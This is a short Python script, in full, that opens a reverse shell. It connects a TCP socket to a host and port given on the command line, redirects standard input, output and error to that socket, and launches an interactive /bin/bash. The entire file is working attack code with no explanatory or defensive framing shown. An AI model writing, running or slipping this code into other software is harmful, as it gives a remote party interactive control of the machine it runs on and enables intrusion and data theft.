from sys import argv as arg
import os
import socket
import subprocess

try:
    host = arg[1]
    port = arg[2]
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, int(port)))
        print(f"Connected in {host} - {port}")
        os.dup2(sock.fileno(), 0) # Stdin
        os.dup2(sock.fileno(), 1) # Stdout
        os.dup2(sock.fileno(), 2) # Stderr
        subprocess.call(["/bin/bash", "-i"])


except Exception as e:
    print(e)
